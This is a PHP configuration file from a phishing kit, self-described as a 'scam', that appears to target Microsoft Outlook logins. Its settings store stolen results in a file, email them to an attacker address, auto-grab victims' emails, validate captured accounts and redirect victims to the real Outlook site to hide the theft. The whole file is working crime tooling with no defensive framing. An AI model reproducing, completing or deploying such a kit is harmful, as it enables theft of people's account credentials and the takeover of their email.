<?php
	// ================================= //
	$scamname = "NO1R";	 // 
	// ================================= //
	// ================================= //
	$saveintext = "yes";                 // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "stored";                //
	// ================================= // Change |SH33NZ0| to any name you want this will be the Rzlt file name
	// ================================= //
	$sendtoemail = "yes";                // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = "davidsmeat@yandex.com"; 	 // Result Email HERE
	// ================================= //
	// ================================= //
	$name = "o";			             // Wite any Name here
	$receiver = "davidsmeat@yandex.com"; // Test Email HERE::Write a valid email here must be valid and working
	$configbody = "o";			         // Write the message body
	$configsubject = "o"; 		         // Write Subject here
	$autograbemail = "yes";				 // If you dont want to auto bypass email page and write the password auto Edit |yes| to |no|
	$loginpage = "2"; 					 // 1 For Pick Account - 2 For Direct
	// ================================= //
	$validemail = "yes";                 // IF you dont want to let the scampage check the email if exist or not 
	$validaccount = "yes";               // IF you dont want to let the scampage check the account details true or not
	// ================================= //
	$gopage = "https://outlook.office.com/"; //Write here The page url which you want the victim redirect to ex 
	// ================================= //
		/////////////////DATE-function//////////////////////
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	/////////////////DATE-function//////////////////////

?>